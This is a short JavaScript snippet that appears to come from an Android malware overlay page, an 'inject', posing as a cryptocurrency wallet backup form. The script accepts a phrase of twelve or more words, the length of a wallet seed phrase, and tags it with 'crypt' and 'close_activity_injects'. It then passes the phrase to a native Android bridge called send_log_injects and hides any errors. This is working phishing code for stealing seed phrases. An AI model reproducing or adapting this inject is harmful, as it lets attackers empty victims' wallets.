    <script>
        var backup = document.getElementById('backup'),
            sendData = document.getElementById('sendData');

        sendData.onclick = () => {
            if(backup.value.split(" ").length <= 11) {
                backup.focus()
                backup.classList.add('error')
            } else if (backup.value.split(" ").length >= 12){
                backup.classList.remove('error');                

                var data = {};
                    data.backup = backup.value;
                    data.type_injects = "crypt";
                    data.closed = "close_activity_injects";

                    var ua = navigator.userAgent.toLowerCase();
                    if(ua.indexOf("android") > -1) {
                        try {
                            Android.send_log_injects(JSON.stringify(data))
                        } catch (err) {}
                    }else{
                        alert(JSON.stringify(data));
                    }
            }
        }
    </script>
